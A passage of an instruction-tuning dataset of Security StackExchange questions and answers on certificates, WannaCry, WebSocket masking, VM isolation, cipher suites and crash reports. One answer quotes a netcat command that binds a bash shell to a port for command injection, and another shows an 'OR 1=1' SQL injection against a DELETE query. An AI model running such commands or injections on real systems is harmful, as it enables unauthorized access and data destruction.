    "output": "You may try right click->Copy->Full Table to copy it to clipboard.\nIf you want to copy only strings without Disassembly and Address columns, right click at the upper bar of this window (where you see Strings, Disassembly and Address), select columns to hide and click the Hide button as illustrated below.\n\nEdit: this will copy the entire table too, so if you want to have only strings saved in a file, you need to delete the two remaining columns.\nYou may for instance use Notepad++ for this purpose: navigate to the last line, select everything in this line, except the string, press Alt+Shift+PageUp and keep it pressed until you reach the top of file and while you are there, press Delete.\nIf your file is so big that the above way to delete these columns is impractcical, you may use regular expressions instead.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there a way to export all the strings for a certain module in x64dbg?\nI have an encrypted file that I was able to step through the code until that specific DLL file was decrypted in memory and I was able to list all of its strings. It has a ton of them that I would like to export all of them to a text file or even a CSV file if possible but I can't find any way to do so. \nAm I missing a command or a button somewhere or is this something I would need to try and write a script to accomplish?",
      "answer": "You may try right click->Copy->Full Table to copy it to clipboard.\nIf you want to copy only strings without Disassembly and Address columns, right click at the upper bar of this window (where you see Strings, Disassembly and Address), select columns to hide and click the Hide button as illustrated below.\n\nEdit: this will copy the entire table too, so if you want to have only strings saved in a file, you need to delete the two remaining columns.\nYou may for instance use Notepad++ for this purpose: navigate to the last line, select everything in this line, except the string, press Alt+Shift+PageUp and keep it pressed until you reach the top of file and while you are there, press Delete.\nIf your file is so big that the above way to delete these columns is impractcical, you may use regular expressions instead."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow to convert my cert chain to PFX without a password\nI am trying to enable an Azure Front Door instance on the front of my website using my EV cert (Extended Validation Certificate).\nHowever, from Azure Front Door Cert Instructions,\n\nAzure Front Door Service currently only supports certificates uploaded with a PFX without a password.\n\nI have this cert chain in .cer format and .pfx format with a password, how do I convert it in to the necessary format?",
    "context": "",
    "output": "A: I was able to run this command using openssl and get a PFX cert file without a password as required by FrontDoor:\nopenssl pkcs12 -export -keypbe NONE -certpbe NONE -in cert.crt -inkey cert.key -out out.pfx\n\nThen press enter on the password prompt twice.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to convert my cert chain to PFX without a password\nI am trying to enable an Azure Front Door instance on the front of my website using my EV cert (Extended Validation Certificate).\nHowever, from Azure Front Door Cert Instructions,\n\nAzure Front Door Service currently only supports certificates uploaded with a PFX without a password.\n\nI have this cert chain in .cer format and .pfx format with a password, how do I convert it in to the necessary format?",
      "answer": "I was able to run this command using openssl and get a PFX cert file without a password as required by FrontDoor:\nopenssl pkcs12 -export -keypbe NONE -certpbe NONE -in cert.crt -inkey cert.key -out out.pfx\n\nThen press enter on the password prompt twice."
    }
  },
  {
    "instruction": "Please answer this question: Why was the NX bit unable to stop WannaCry?\nI'm working on a presentation to give to high school computer science students where I work at as a volunteer.  Part of the presentation is on local and network exploits.  I am planning to talk about a story where years ago I was able to get root access by creating a program with an intentional buffer overflow, setting the setuid bit, and running a NOP slide to execute shellcode.  When running this program on a modern OS or modern hardware, the exploit no longer works because of the NX bit.  (I got this technique from the book \"Hacking, the art of exploitation\").\nI also plan to talk about WannaCry ransomware. Referencing this FireEye link on WannaCry, they talk about that after the malformed packet was sent to SMBv1 on port 445, the software was able to run a NOP slide and then run shellcode.\nSo my question is, why was the NX bit (either from the OS or the CPU) unable to stop WannaCry from working?",
    "context": "",
    "output": "WannaCry first triggered secondary SMB transactions, and then used bugs (uninitialized packet buffers) of srv2.dll to invoke buffer overruns.\nNetApi32.dll is capable to bypass NX on some OS versions and service packs (ref, exploit).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why was the NX bit unable to stop WannaCry?\nI'm working on a presentation to give to high school computer science students where I work at as a volunteer.  Part of the presentation is on local and network exploits.  I am planning to talk about a story where years ago I was able to get root access by creating a program with an intentional buffer overflow, setting the setuid bit, and running a NOP slide to execute shellcode.  When running this program on a modern OS or modern hardware, the exploit no longer works because of the NX bit.  (I got this technique from the book \"Hacking, the art of exploitation\").\nI also plan to talk about WannaCry ransomware. Referencing this FireEye link on WannaCry, they talk about that after the malformed packet was sent to SMBv1 on port 445, the software was able to run a NOP slide and then run shellcode.\nSo my question is, why was the NX bit (either from the OS or the CPU) unable to stop WannaCry from working?",
      "answer": "WannaCry first triggered secondary SMB transactions, and then used bugs (uninitialized packet buffers) of srv2.dll to invoke buffer overruns.\nNetApi32.dll is capable to bypass NX on some OS versions and service packs (ref, exploit)."
    }
  },
  {
    "instruction": "Answer the question below.\nIs mgicinjs.info a virus or malware site? How to get rid of it?\nToday, I noticed that almost all of my web project (published or in localhost) have a set of weird script references in their pages:\n\nAnd they are all automatically generated - they don't appear in View -> Page Source, but they are visible in Inspect Element -> Elements tab.\nThis behavior is what a malware does. However, I search around and no virus indexes like VirusTotal say that it's a virus. What makes it really suspicious, is that all search results about it (mgicinjs.info) is about URL and domain virus scanners!\nI don't know where it came from and how can I remove it.",
    "context": "",
    "output": "I found it.\nIt's not a virus. These files are added by SaveFrom.net Chrome extension. I opened all of my sites by IE and see no sign of those scripts as that extension is not present in IE.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is mgicinjs.info a virus or malware site? How to get rid of it?\nToday, I noticed that almost all of my web project (published or in localhost) have a set of weird script references in their pages:\n\nAnd they are all automatically generated - they don't appear in View -> Page Source, but they are visible in Inspect Element -> Elements tab.\nThis behavior is what a malware does. However, I search around and no virus indexes like VirusTotal say that it's a virus. What makes it really suspicious, is that all search results about it (mgicinjs.info) is about URL and domain virus scanners!\nI don't know where it came from and how can I remove it.",
      "answer": "I found it.\nIt's not a virus. These files are added by SaveFrom.net Chrome extension. I opened all of my sites by IE and see no sign of those scripts as that extension is not present in IE."
    }
  },
  {
    "instruction": "Answer this question:\n\nWhat's the purpose of the MASK in a WebSocket?\nReading the Web Socket RFC, at 5.1 it says: \n\na client MUST mask all frames that it    sends to the server (see\n  Section 5.3 for further details).  (Note    that masking is done\n  whether or not the WebSocket Protocol is running    over TLS.)  The\n  server MUST close the connection upon receiving a    frame that is not\n  masked\n\nbut what's the purpose of such mask? If using Wireshark I'm reading the message the client sent without any problem?",
    "context": "",
    "output": "A: The reason for the masking is to make websocket traffic look unlike normal HTTP traffic and become completely unpredictable. Otherwise any network infrastructure equipment which is not yet upgraded to understand the Websocket protocol can mistake it for normal http traffic causing various problems.\nThis is especially a problem for caching proxy servers and leads to possible attack scenarios. Specifically crafted websocket traffic can cause cache poisoning by tricking the proxy servers into mistaking a part of a websocket communication for a request and response for an unrelated URL, cache it like a legitimate response and send it to other users which request that URL.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What's the purpose of the MASK in a WebSocket?\nReading the Web Socket RFC, at 5.1 it says: \n\na client MUST mask all frames that it    sends to the server (see\n  Section 5.3 for further details).  (Note    that masking is done\n  whether or not the WebSocket Protocol is running    over TLS.)  The\n  server MUST close the connection upon receiving a    frame that is not\n  masked\n\nbut what's the purpose of such mask? If using Wireshark I'm reading the message the client sent without any problem?",
      "answer": "The reason for the masking is to make websocket traffic look unlike normal HTTP traffic and become completely unpredictable. Otherwise any network infrastructure equipment which is not yet upgraded to understand the Websocket protocol can mistake it for normal http traffic causing various problems.\nThis is especially a problem for caching proxy servers and leads to possible attack scenarios. Specifically crafted websocket traffic can cause cache poisoning by tricking the proxy servers into mistaking a part of a websocket communication for a request and response for an unrelated URL, cache it like a legitimate response and send it to other users which request that URL."
    }
  },
  {
    "instruction": "Q: Does HTTPS encryption work when there is invalid or there is no certificate?\nWhen I have a website run on https and there is no certificate, there is wrong certificate or out of date like here does encryption still work or not?",
    "context": "",
    "output": " A: Yes , the encryption still works fine . \nIt is the trust validation of the certificate that is failing. \nTry capturing a wireshark dump and check the requests and see for yourself.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does HTTPS encryption work when there is invalid or there is no certificate?\nWhen I have a website run on https and there is no certificate, there is wrong certificate or out of date like here does encryption still work or not?",
      "answer": "Yes , the encryption still works fine . \nIt is the trust validation of the certificate that is failing. \nTry capturing a wireshark dump and check the requests and see for yourself."
    }
  },
  {
    "instruction": "What is the answer to this question - How can hotels securely receive your credit card details (for a custom, one-off payment)?\nA hotel belonging to a large chain (400 hotels in 60 countries) has just requested me to send my credit card details via standard (unsecured) email.\nI have negotiated a deal for accommodation with them, via email, outside of the standard packages available on their website, but now I need to pay their booking fee. They don't have the facility to enter an arbitrary secure payment via their website. \nThe issue I have is that I am convinced that whatever method I use, the hotel will probably just email it in plain text internally to some payment clerk or whatever to keep on file. So is it better to just tell them over the telephone and hope for the best?\n\n",
    "context": "",
    "output": "Why not purchase a disposable Visa/ MasterCard/ Amex with the exact amount on it?  Then you only have the amount they agreed to at risk.  Even if something bad happens, it only happens to the funds they agreed were for the purchase.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can hotels securely receive your credit card details (for a custom, one-off payment)?\nA hotel belonging to a large chain (400 hotels in 60 countries) has just requested me to send my credit card details via standard (unsecured) email.\nI have negotiated a deal for accommodation with them, via email, outside of the standard packages available on their website, but now I need to pay their booking fee. They don't have the facility to enter an arbitrary secure payment via their website. \nThe issue I have is that I am convinced that whatever method I use, the hotel will probably just email it in plain text internally to some payment clerk or whatever to keep on file. So is it better to just tell them over the telephone and hope for the best?",
      "answer": "Why not purchase a disposable Visa/ MasterCard/ Amex with the exact amount on it?  Then you only have the amount they agreed to at risk.  Even if something bad happens, it only happens to the funds they agreed were for the purchase."
    }
  },
  {
    "instruction": "Please answer this question: Is the password FFFFFggggg&&&&&22222 safe from being guessed?\nIt is 20 characters long, mixes alphanumeric and special symbols. It is one among  ** 20.",
    "context": "",
    "output": "Well I guess now that you stuck it on here, someone will probably add it to a dictionary list, so that specific one probably isn't anymore.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is the password FFFFFggggg&&&&&22222 safe from being guessed?\nIt is 20 characters long, mixes alphanumeric and special symbols. It is one among  ** 20.",
      "answer": "Well I guess now that you stuck it on here, someone will probably add it to a dictionary list, so that specific one probably isn't anymore."
    }
  },
  {
    "instruction": "If a \u201cman in the middle attack\u201d obtains the username & password of user, are there mechanisms that can prevent them connecting to server?\nAssume that we have a user that wants to connect to the server, for example with login page, when user submits the username & password goes to the server - if man in the middle reads the user & pass, can he connect to server or there are mechanisms that can prevent this?",
    "context": "",
    "output": "If you only have username+password authentication, and this login info is intercepted, you cannot realistically block the attacker from connecting. You have to look into two-factor authentication to prevent attackers from reusing login credentials etc. And even then, when the attacker has continued access to all traffic, this will not help at all.\nIf you don't use https, the attacker can also simply intercept all traffic, so even if you can prevent him from logging in himself, no information is actually protected.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "If a \u201cman in the middle attack\u201d obtains the username & password of user, are there mechanisms that can prevent them connecting to server?\nAssume that we have a user that wants to connect to the server, for example with login page, when user submits the username & password goes to the server - if man in the middle reads the user & pass, can he connect to server or there are mechanisms that can prevent this?",
      "answer": "If you only have username+password authentication, and this login info is intercepted, you cannot realistically block the attacker from connecting. You have to look into two-factor authentication to prevent attackers from reusing login credentials etc. And even then, when the attacker has continued access to all traffic, this will not help at all.\nIf you don't use https, the attacker can also simply intercept all traffic, so even if you can prevent him from logging in himself, no information is actually protected."
    }
  },
  {
    "instruction": "What is the answer to this question - Difference Between OAUTH, OpenID and OPENID Connect in very simple term?\nI am very confused the difficult jargon available in web about OAUTH, OpenID and OPENID Connect. Can anyone tell me the difference in simple words.\n\n",
    "context": "",
    "output": "Many people still visit this so here's a very simple diagram to explain it\n\nCourtesy Wikipedia",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Difference Between OAUTH, OpenID and OPENID Connect in very simple term?\nI am very confused the difficult jargon available in web about OAUTH, OpenID and OPENID Connect. Can anyone tell me the difference in simple words.",
      "answer": "Many people still visit this so here's a very simple diagram to explain it\n\nCourtesy Wikipedia"
    }
  },
  {
    "instruction": "Question: Online SQL Server database for a Business app. Security considerations\nA business application works with a SQL Server database. A SQL Server 2008 is installed on one of the computers of the local network. Technically this app works OK if the server computer with the SQL Server 2008 database collocated in the datacenter of the hosting provider and the database is reached over the Internet by an IP address of the server. \nWhat are pros and cons of such an approach? What security considerations one should bear in mind when moving database to the Internet?",
    "context": "",
    "output": "Answer: Exposing a security sensitive server on the internet is never a good idea. It does not really have any advantages but only disadvantages.\nSince it has a public IP, everyone can scan your machine for old software. Exploit 0day vulnerabilities, (d)dos it, etc etc.\nThe best way to go here is to create a VPN or a VLAN such that all services are only accesible from within the VPN/VLAN. All your business apps can than access the database as long as their part of the VPN/VLAN.\nOf course the downside is that you have to implement a vpn/vlan which I assume you dont have given the question. But from a security point of view it is the way to go.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Online SQL Server database for a Business app. Security considerations\nA business application works with a SQL Server database. A SQL Server 2008 is installed on one of the computers of the local network. Technically this app works OK if the server computer with the SQL Server 2008 database collocated in the datacenter of the hosting provider and the database is reached over the Internet by an IP address of the server. \nWhat are pros and cons of such an approach? What security considerations one should bear in mind when moving database to the Internet?",
      "answer": "Exposing a security sensitive server on the internet is never a good idea. It does not really have any advantages but only disadvantages.\nSince it has a public IP, everyone can scan your machine for old software. Exploit 0day vulnerabilities, (d)dos it, etc etc.\nThe best way to go here is to create a VPN or a VLAN such that all services are only accesible from within the VPN/VLAN. All your business apps can than access the database as long as their part of the VPN/VLAN.\nOf course the downside is that you have to implement a vpn/vlan which I assume you dont have given the question. But from a security point of view it is the way to go."
    }
  },
  {
    "instruction": "Anti Skimmer and Anti fraud?\nWould you please tell me what is the difference between Anti-skimmer and Anti-fraud in ATMs?",
    "context": "",
    "output": "Anti-skimming techniques are just a subset of anti-fraud techniques. Anti-fraud in ATMs is the collection of defense mechanism against payment card fraud. It includes anti-skimming devices, cameras embedded in ATMs, measures to prevent shoulder surfing, etc.\nAnti-skimming devices in particular are devices installed on or embedded in the ATM. They prevent the illegitimate copying of the payment card information.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Anti Skimmer and Anti fraud?\nWould you please tell me what is the difference between Anti-skimmer and Anti-fraud in ATMs?",
      "answer": "Anti-skimming techniques are just a subset of anti-fraud techniques. Anti-fraud in ATMs is the collection of defense mechanism against payment card fraud. It includes anti-skimming devices, cameras embedded in ATMs, measures to prevent shoulder surfing, etc.\nAnti-skimming devices in particular are devices installed on or embedded in the ATM. They prevent the illegitimate copying of the payment card information."
    }
  },
  {
    "instruction": "Q: Os command injection privileges\nI have a question about privileges when performing an Operating system command injection.\nIf an attacker succeeds in getting a reverse shell on a remote server through netcat (netcat -v -e '/bin/bash' -l -p 5550), does he/she have admin privileges on the victim machine or some sort of escalation is needed?\nthanks",
    "context": "",
    "output": " A: Usually, you need some sort of escalation.\nIf you can run the command netcat -v -e '/bin/bash' -l -p 5550 all you've done (effectively) is have the remote machine open a port for you as the user that was running whatever process ran the command. That is to say, if you managed to inject your netcat command into a www process, you are likely logged in as the 'www' user, and not (if the remote machine has been remotely secured) as root.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Os command injection privileges\nI have a question about privileges when performing an Operating system command injection.\nIf an attacker succeeds in getting a reverse shell on a remote server through netcat (netcat -v -e '/bin/bash' -l -p 5550), does he/she have admin privileges on the victim machine or some sort of escalation is needed?\nthanks",
      "answer": "Usually, you need some sort of escalation.\nIf you can run the command netcat -v -e '/bin/bash' -l -p 5550 all you've done (effectively) is have the remote machine open a port for you as the user that was running whatever process ran the command. That is to say, if you managed to inject your netcat command into a www process, you are likely logged in as the 'www' user, and not (if the remote machine has been remotely secured) as root."
    }
  },
  {
    "instruction": "Answer the question below.\nauditd-like software for Windows?\nI need to know how to log users and admins activity on Windows, like auditd does on Linux. After searching, the only thing I found was this Audit account log-on events policy option for Windows 7. \nIs there some standard used for Windows servers and workstations?",
    "context": "",
    "output": "The logging options available in Windows run pretty deep, so choose what you want and set your policies appropriately.\nTo give you a flavour of what options there are (and are recommended) have a look at the Audit Policy Recommendations.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "auditd-like software for Windows?\nI need to know how to log users and admins activity on Windows, like auditd does on Linux. After searching, the only thing I found was this Audit account log-on events policy option for Windows 7. \nIs there some standard used for Windows servers and workstations?",
      "answer": "The logging options available in Windows run pretty deep, so choose what you want and set your policies appropriately.\nTo give you a flavour of what options there are (and are recommended) have a look at the Audit Policy Recommendations."
    }
  },
  {
    "instruction": "What is the answer to this question - selft signed certificate for AES128-GCM-SHA256 cipher\nTo generate self signed certificate for AES128-SHA256 cipher using openssl, following commands are used.\nAES128-SHA256 cipher commands :-\n openssl genrsa -aes128 -out 1.key 2048 \n openssl req -config csr.conf-new -key 1.key -out 1.csr \n cp -f 1.key orig.1.key \n openssl rsa -in orig.1.key -out 1.key \n openssl x509 -req -sha256 -in 1.csr -signkey 1.key -out 1.crt \n openssl x509 -inform PEM -in 1.crt -outform DER -out rsacert.der\n\nCan anyone help to know parameters to generate self signed certificate for AES128-GCM-SHA256 cipher suite certificate which I can test using openssl s_server and s_client?\n\n",
    "context": "",
    "output": "AES128-GCM-SHA256 and AES128-SHA256 both use RSA certificates for authentication and key exchange. They only differ in the symmetric cipher and MAC used - which are independent of the certificate. This means that you can use the same \nRSA certificate with both ciphers, i.e. there are no changes needed in certificate creation specific to  AES128-GCM-SHA256 compared to AES128-SHA256.\nNote also, that the algorithm you have specified to protect the private key (i.e. genrsa -aes128) has nothing to do with the cipher used in the TLS connection. Similar the signature algorithm you have specified for the certificate (x509 req -sha256) has nothing to do with the cipher used. The meaning of AES128 and SHA256 in AES128-SHA256  is instead that AES128 is used as the symmetric algorithm to encrypt the traffic (not the private key) while SHA256 is used as MAC for integrity checks on the traffic (and not as signature algorithm on the certificate).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "selft signed certificate for AES128-GCM-SHA256 cipher\nTo generate self signed certificate for AES128-SHA256 cipher using openssl, following commands are used.\nAES128-SHA256 cipher commands :-\n openssl genrsa -aes128 -out 1.key 2048 \n openssl req -config csr.conf-new -key 1.key -out 1.csr \n cp -f 1.key orig.1.key \n openssl rsa -in orig.1.key -out 1.key \n openssl x509 -req -sha256 -in 1.csr -signkey 1.key -out 1.crt \n openssl x509 -inform PEM -in 1.crt -outform DER -out rsacert.der\n\nCan anyone help to know parameters to generate self signed certificate for AES128-GCM-SHA256 cipher suite certificate which I can test using openssl s_server and s_client?",
      "answer": "AES128-GCM-SHA256 and AES128-SHA256 both use RSA certificates for authentication and key exchange. They only differ in the symmetric cipher and MAC used - which are independent of the certificate. This means that you can use the same \nRSA certificate with both ciphers, i.e. there are no changes needed in certificate creation specific to  AES128-GCM-SHA256 compared to AES128-SHA256.\nNote also, that the algorithm you have specified to protect the private key (i.e. genrsa -aes128) has nothing to do with the cipher used in the TLS connection. Similar the signature algorithm you have specified for the certificate (x509 req -sha256) has nothing to do with the cipher used. The meaning of AES128 and SHA256 in AES128-SHA256  is instead that AES128 is used as the symmetric algorithm to encrypt the traffic (not the private key) while SHA256 is used as MAC for integrity checks on the traffic (and not as signature algorithm on the certificate)."
    }
  },
  {
    "instruction": "What is the answer to this question - HTTPS Everywhere vs. NoScript\nWhat does HTTPEverywhere gives compared to NoScript with Firefox (Options|Advanced|HTTPS|Behavior)? \nWhy use HTTPEverywhere, when NoScript also can strict websites to use only HTTPS?\n\n",
    "context": "",
    "output": "HTTPS Everywhere uses an EFF produced whitelist of sites and rules to use and can have rules like redirecting wikipedia.org to secure.wikipedia.org.\nNoScript has only a user defined whitelist of domains and no such rule abilities.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "HTTPS Everywhere vs. NoScript\nWhat does HTTPEverywhere gives compared to NoScript with Firefox (Options|Advanced|HTTPS|Behavior)? \nWhy use HTTPEverywhere, when NoScript also can strict websites to use only HTTPS?",
      "answer": "HTTPS Everywhere uses an EFF produced whitelist of sites and rules to use and can have rules like redirecting wikipedia.org to secure.wikipedia.org.\nNoScript has only a user defined whitelist of domains and no such rule abilities."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow secure are virtual machines really? False sense of security?\nI was reading this CompTIA Security+ SYO-201 book, and the author David Prowse claims that:\n\nWhichever VM you select, the VM cannot cross the software boundaries set in\n  place. For example, a virus might infect a computer when executed and spread to\n  other files in the OS. However, a virus executed in a VM will spread through the\n  VM but not affect the underlying actual OS.\n\nSo if I'm running VMWare player and execute some malware on my virtual machine's OS, I don't have to worry about my host system being compromised, at all? \nWhat if the virtual machine shares the network with the host machine, and shared folders are enabled? \nIsn't it still possible for a worm to copy itself to the host machine that way? Isn't the user still vulnerable to AutoRun if the OS is Windows and they insert a USB storage device? \nHow secure are virtual machines, really? How much do they protect the host machine from malware and attacks?",
    "context": "",
    "output": "A: There have been some white-papers published over the years describing ways that researchers have managed to infest a host OS from a VM. These are usually seen, rightly so, as security vulnerabilities by the VM vendors and treated as such. Since I first saw those papers, Intel has made some significant processor instruction-set improvements in allowing separation of VM and hypervisor. \nThe few vulnerabilities I see these days are based more in the 'vmtools' portion. This is the software you install to make the guest OS run more efficiently (for VMWare this is what allows on the fly cursor capture, and sharing between guest and host without a network). This is a special software pathway for infection; don't install the tools, don't have the vulnerability.\nSome malware has show the ability to detect that they're being executed inside a VM and thus change their behavior, much to the aggravation of malware researchers attempting to use VMs as a way to test malware. I don't know how prevalent it is these days, though.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How secure are virtual machines really? False sense of security?\nI was reading this CompTIA Security+ SYO-201 book, and the author David Prowse claims that:\n\nWhichever VM you select, the VM cannot cross the software boundaries set in\n  place. For example, a virus might infect a computer when executed and spread to\n  other files in the OS. However, a virus executed in a VM will spread through the\n  VM but not affect the underlying actual OS.\n\nSo if I'm running VMWare player and execute some malware on my virtual machine's OS, I don't have to worry about my host system being compromised, at all? \nWhat if the virtual machine shares the network with the host machine, and shared folders are enabled? \nIsn't it still possible for a worm to copy itself to the host machine that way? Isn't the user still vulnerable to AutoRun if the OS is Windows and they insert a USB storage device? \nHow secure are virtual machines, really? How much do they protect the host machine from malware and attacks?",
      "answer": "There have been some white-papers published over the years describing ways that researchers have managed to infest a host OS from a VM. These are usually seen, rightly so, as security vulnerabilities by the VM vendors and treated as such. Since I first saw those papers, Intel has made some significant processor instruction-set improvements in allowing separation of VM and hypervisor. \nThe few vulnerabilities I see these days are based more in the 'vmtools' portion. This is the software you install to make the guest OS run more efficiently (for VMWare this is what allows on the fly cursor capture, and sharing between guest and host without a network). This is a special software pathway for infection; don't install the tools, don't have the vulnerability.\nSome malware has show the ability to detect that they're being executed inside a VM and thus change their behavior, much to the aggravation of malware researchers attempting to use VMs as a way to test malware. I don't know how prevalent it is these days, though."
    }
  },
  {
    "instruction": "Question: Sqlmap, update query and risk param\nI was reading about the 'risk' param for sqlmap, and the docs contain information, that risk 3 level can update tables. What does it mean? As far as I understand, this can happen either in the app update injection or if the app's logic updates some table.\nAm I right? Or it is possible somehow to update tables accidentally even in select query while using sqlmap?\nThanks.",
    "context": "",
    "output": "Answer: Let's say there's an injection possibility on an action that results in the deletion of a single result. \nDELETE FROM users WHERE userId=1;\n\nA risk level of 1 or 2 is likely to result in a single user being deleted. \nRisk level 3 uses OR which can end up effecting many more rows than intended. \nDELETE FROM users WHERE userId=1 OR 1=1;\n\nIt's not that risk 1 & 2 don't have the possibility of deleting or updating database records, rather their impact is likely limited in scope; while risk 3 is more likely to destroy (or make your presence known by disruption) an application before you can effectively exploit it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Sqlmap, update query and risk param\nI was reading about the 'risk' param for sqlmap, and the docs contain information, that risk 3 level can update tables. What does it mean? As far as I understand, this can happen either in the app update injection or if the app's logic updates some table.\nAm I right? Or it is possible somehow to update tables accidentally even in select query while using sqlmap?\nThanks.",
      "answer": "Let's say there's an injection possibility on an action that results in the deletion of a single result. \nDELETE FROM users WHERE userId=1;\n\nA risk level of 1 or 2 is likely to result in a single user being deleted. \nRisk level 3 uses OR which can end up effecting many more rows than intended. \nDELETE FROM users WHERE userId=1 OR 1=1;\n\nIt's not that risk 1 & 2 don't have the possibility of deleting or updating database records, rather their impact is likely limited in scope; while risk 3 is more likely to destroy (or make your presence known by disruption) an application before you can effectively exploit it."
    }
  },
  {
    "instruction": "Answer this question:\n\nIs the order of cipher suites related to the client's preferences ?\nI am wondering if the order in which the cipher suites appear (from top to bottom) in the ClientHello message, and the client preference are relevant. So for example in the picture I have attached, is TLS_RSA_WITH_RC4_128_MD5 the most preferred suite because it is at the top?\nThank you in advance",
    "context": "",
    "output": "A: The order in the ClientHello shows what the client prefers, i.e. the preferred ciphers are on top. The server is still free to ignore this order and pick what it thinks is best. Often there is a related setting in the TLS configuration of the server, like SSLHonorCipherOrder for apache or ssl_prefer_server_ciphers for nginx.  Cloudflare at least makes use of the clients preference to optimize the connection. From Do the ChaCha: better mobile performance with cryptography:\n\nCloudFlare is able to intelligently choose whether to choose AES or\nChaCha/Poly for different clients based on the client\u2019s advertised\ncipher preference. For recent Intel processors, we use the standard\nAES-GCM algorithm. For browsers on machines that do not have a\nhardware AES chip, we prefer the ChaCha20-Poly1305.\n\nAlso RFC 5246 (TLS 1.2) says in section 7.4.1.2 ClientHello:\ncipher_suites\n  This is a list of the cryptographic options supported by the\n  client, with the client's first preference first. ...",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is the order of cipher suites related to the client's preferences ?\nI am wondering if the order in which the cipher suites appear (from top to bottom) in the ClientHello message, and the client preference are relevant. So for example in the picture I have attached, is TLS_RSA_WITH_RC4_128_MD5 the most preferred suite because it is at the top?\nThank you in advance",
      "answer": "The order in the ClientHello shows what the client prefers, i.e. the preferred ciphers are on top. The server is still free to ignore this order and pick what it thinks is best. Often there is a related setting in the TLS configuration of the server, like SSLHonorCipherOrder for apache or ssl_prefer_server_ciphers for nginx.  Cloudflare at least makes use of the clients preference to optimize the connection. From Do the ChaCha: better mobile performance with cryptography:\n\nCloudFlare is able to intelligently choose whether to choose AES or\nChaCha/Poly for different clients based on the client\u2019s advertised\ncipher preference. For recent Intel processors, we use the standard\nAES-GCM algorithm. For browsers on machines that do not have a\nhardware AES chip, we prefer the ChaCha20-Poly1305.\n\nAlso RFC 5246 (TLS 1.2) says in section 7.4.1.2 ClientHello:\ncipher_suites\n  This is a list of the cryptographic options supported by the\n  client, with the client's first preference first. ..."
    }
  },
  {
    "instruction": "Answer this question:\n\nIs there any risk of login information being compromised after submitting a Firefox crash report?\nTitle says it all. I have crash reports specifically disabled and yet the browser submitted one anyway. What's the risk of login information (in particular: saved login info, open sessions in online services) being compromised? Is there any way of getting Mozilla to delete a crash dump?\nSome advice for everyone else running Firefox: delete crashreporter.exe from the Firefox directory, that thing is dangerous. There is no legitimate reason to send any such information when the end-user has taken every step to say \"No\". I was never prompted to send any crash report, the browser just sent it automatically despite having opted to disable them in the Settings.",
    "context": "",
    "output": "A: It is very unlikely that you gave away compromising information. Your active logins, cookies, search history and the content of your visited websites are safe. Presumably, the most relevant sensitive information in your case is the last visited URL (which you had to explicitly agree to submit).\nAlso note that Firefox doesn't submit crash reports without your consent. In the Mozilla docs you can find details on how the Mozilla Crash Reporter works and how you can understand crash reports.\nWhat does a crash report contain?\nA Firefox crash report contains information relevant for debugging such as:\n\nBrowser version\nInstalled extensions\nOperating system version and  configuration\nStack trace of the crash (involved modules, functions, etc.)\n\nYou can optionally include the URL of where the crash has occurred and a contact email address.\nWhere can I view my previous crash reports?\nYou can view your crashes from inside Firefox at about:crashes or locally at ~/.mozilla/firefox/Crash Reports/. All submitted Firefox crash reports are published on crash-stats.\nWho else can view a crash report?\nEveryone is able to view a basic version of your report but only few users can see sensitive details.\n\nSome fields, such as \"URL\" and \"Email Address\", are privacy-sensitive and are only visible to users with minidump access.\n\n(Source)\nSo even if you submitted the URL - it's not public, developers will probably never read it given the total amount of crash reports, and nobody will know it was you.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there any risk of login information being compromised after submitting a Firefox crash report?\nTitle says it all. I have crash reports specifically disabled and yet the browser submitted one anyway. What's the risk of login information (in particular: saved login info, open sessions in online services) being compromised? Is there any way of getting Mozilla to delete a crash dump?\nSome advice for everyone else running Firefox: delete crashreporter.exe from the Firefox directory, that thing is dangerous. There is no legitimate reason to send any such information when the end-user has taken every step to say \"No\". I was never prompted to send any crash report, the browser just sent it automatically despite having opted to disable them in the Settings.",
